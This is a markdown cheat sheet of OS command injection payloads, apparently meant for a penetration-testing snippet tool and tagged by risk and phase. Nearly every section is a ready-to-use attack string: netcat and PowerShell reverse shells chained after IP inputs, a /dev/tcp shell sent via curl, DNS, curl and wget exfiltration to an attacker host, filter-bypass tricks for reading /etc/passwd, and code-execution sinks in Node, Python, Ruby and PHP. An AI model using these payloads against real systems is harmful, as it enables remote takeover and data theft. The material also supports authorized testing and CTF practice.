# Command Injection

> OS command injection payloads — separators, blind, filter bypass, language-specific

<!-- tags: cmdi, rce, web, payload, exploit, injection -->

---

## inject command separators
Common command chaining operators.

```bash
echo "; id"
echo "&& id"
echo "| id"
echo "|| id"
echo "%0a id"
echo "\$(id)"
echo "\`id\`"
```

<!-- meta: risk=med | phase=exploit | tags=cmdi,basic -->

---

## reverse shell via &&
Chain after a known-good IP/hostname.

```bash
echo "8.8.8.8 && rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {{LHOST:ip}} {{LPORT:port:9001}} >/tmp/f"
```

<!-- meta: risk=critical | phase=exploit | tags=cmdi,revshell -->

---

## reverse shell via semicolon
Statement-terminator chain.

```bash
echo "8.8.8.8 ; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {{LHOST:ip}} {{LPORT:port:9001}} >/tmp/f"
```

<!-- meta: risk=critical | phase=exploit | tags=cmdi,revshell -->

---

## reverse shell via ||
Run on failure (when first cmd errors).

```bash
echo "8.8.8.8 || rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {{LHOST:ip}} {{LPORT:port:9001}} >/tmp/f"
```

<!-- meta: risk=critical | phase=exploit | tags=cmdi,revshell -->

---

## inject command url encoded
Encode separators when web filter blocks them.

```bash
echo "8.8.8.8%20%26%26%20id"
```

<!-- meta: risk=med | phase=exploit | tags=cmdi,encoding -->

---

## command injection blind time based
Confirm CMDi when output is suppressed.

```bash
echo "; sleep 5"
echo "& ping -c 5 127.0.0.1"
```

<!-- meta: risk=safe | phase=vuln | tags=cmdi,blind,time -->

---

## command injection blind dns exfil
Exfil data via DNS lookup callback.

```bash
echo "; nslookup \$(whoami).{{ATTACKER_DOMAIN:domain:attacker.com}}"
echo "; \$(whoami).{{ATTACKER_DOMAIN:domain:attacker.com}}"
```

<!-- meta: risk=med | phase=exploit | tags=cmdi,blind,dns,exfil -->

---

## bypass space filter IFS
When spaces are blocked use IFS, ${IFS}, tab, or brace.

```bash
echo "{cat,/etc/passwd}"
echo "cat\${IFS}/etc/passwd"
echo "cat\$IFS\$9/etc/passwd"
```

<!-- meta: risk=med | phase=exploit | tags=cmdi,bypass,space -->

---

## bypass slash filter
Use $PATH or wildcards to construct paths.

```bash
echo "cat\${PATH:0:1}etc\${PATH:0:1}passwd"
```

<!-- meta: risk=med | phase=exploit | tags=cmdi,bypass,slash -->

---

## bypass keyword filter blacklist
Split keywords to bypass blacklists.

```bash
echo "ca''t /etc/passwd"
echo "c\\at /etc/passwd"
echo "/usr/bin/cat /etc/passwd"
echo "wh''oami"
```

<!-- meta: risk=med | phase=exploit | tags=cmdi,bypass,keyword -->

---

## read file via injection
Extract any readable file via injection.

```bash
echo "; cat /etc/passwd"
echo "; cat \$(find / -name flag.txt 2>/dev/null)"
```

<!-- meta: risk=med | phase=exploit | tags=cmdi,fileread -->

---

## exfil output curl out of band
Send command output to attacker.

```bash
echo "; curl http://{{LHOST:ip}}:{{LPORT:port:8000}}/?d=\$(id|base64)"
```

<!-- meta: risk=med | phase=exploit | tags=cmdi,oob,exfil -->

---

## exfil output wget OOB
Same idea via wget.

```bash
echo "; wget http://{{LHOST:ip}}:{{LPORT:port:8000}}/?d=\$(whoami)"
```

<!-- meta: risk=med | phase=exploit | tags=cmdi,oob,exfil -->

---

## windows reverse shell powershell
PowerShell reverse shell payload.

```bash
echo "& powershell -nop -c \"\$client=New-Object System.Net.Sockets.TCPClient('{{LHOST:ip}}',{{LPORT:port:9001}});\$stream=\$client.GetStream();[byte[]]\$bytes=0..65535|%{0};while((\$i=\$stream.Read(\$bytes,0,\$bytes.Length)) -ne 0){;\$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i);\$sendback=(iex \$data 2>&1 | Out-String);\$sendback2=\$sendback+'PS '+(pwd).Path+'> ';\$sendbyte=([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""
```

<!-- meta: risk=critical | phase=exploit | tags=cmdi,windows,revshell -->

---

## windows base64 powershell payload
Encoded PowerShell to evade quoting issues.

```bash
echo "{{LHOST:ip}}" | iconv -f utf-8 -t utf-16le | base64 -w0
echo "& powershell -e {{B64:str:JABjAGwAaQBlAG4AdAAg...}}"
```

<!-- meta: risk=critical | phase=exploit | tags=cmdi,windows,powershell -->

---

## inject command windows separators
Windows-specific separators.

```bash
echo "& whoami"
echo "&& whoami"
echo "| whoami"
echo "|| whoami"
echo "%0a whoami"
```

<!-- meta: risk=med | phase=exploit | tags=cmdi,windows,basic -->

---

## argument injection no separator
Abuse arg parsing when separators filtered.

```bash
echo "-oProxyCommand=bash"
echo "--checkpoint-action=exec='id'"
```

<!-- meta: risk=med | phase=exploit | tags=cmdi,argi,bypass -->

---

## inject command via curl url rce
Useful for HTB-style RCE chains.

```bash
curl -s "{{URL:url:http://target.htb/api?cmd=}}\$(id)"
curl -s "{{URL:url:http://target.htb/files/s.php?c=}}bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/{{LHOST:ip}}/{{LPORT:port:9001}}%200%3E%261%27"
```

<!-- meta: risk=critical | phase=exploit | tags=cmdi,curl,revshell -->

---

## node template literal RCE
Trigger Node template literal sink.

```bash
echo "\${require('child_process').execSync('id')}"
```

<!-- meta: risk=critical | phase=exploit | tags=cmdi,node,rce -->

---

## python eval sink RCE
String reaches eval/run sink.

```bash
echo "__import__('os').system('id')"
```

<!-- meta: risk=critical | phase=exploit | tags=cmdi,python,rce -->

---

## ruby backtick RCE
Ruby backtick command run.

```bash
echo "\`id\`"
echo "system('id')"
```

<!-- meta: risk=critical | phase=exploit | tags=cmdi,ruby,rce -->

---

## php system passthru sink RCE
PHP system / passthru / shell_exec sinks.

```bash
echo "system('{{CMD:str:id}}');"
echo "passthru('{{CMD:str:id}}');"
echo "shell_exec('{{CMD:str:id}}');"
echo "\`id\`"
```

<!-- meta: risk=critical | phase=exploit | tags=cmdi,php,rce -->
